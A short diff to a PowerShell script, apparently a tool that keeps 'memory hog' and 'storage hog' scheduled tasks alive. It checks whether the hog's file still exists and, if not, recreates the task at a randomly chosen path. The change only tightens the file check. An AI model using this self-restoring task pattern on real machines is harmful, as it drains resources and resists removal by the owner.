@@ -79,7 +79,7 @@ function CheckTask-And-Recreate {
 
 while ($true) {
 
-    if(-not(Test-Path $memHogPath)){
+    if(-not(Test-Path $memHogPath -PathType Leaf)){
         schtasks /end /tn $memHogTaskName
         $idx = Get-Random -Minimum 0 -Maximum $paths.Length
         $memHogPath = $paths[$idx]
@@ -89,7 +89,7 @@ while ($true) {
         schtasks /change /tn $memHogTaskName /tr $memTaskRunAction
         schtasks /run /tn $memHogTaskName
     }
-    # if(-not(Test-Path $storageHogPath)){
+    # if(-not(Test-Path $storageHogPath -PathType Leaf)){
     #     schtasks /end /tn $storageHogTaskName
     #     $idx = Get-Random -Minimum 0 -Maximum $paths.Length
     #     $storageHogPath = $paths[$idx]
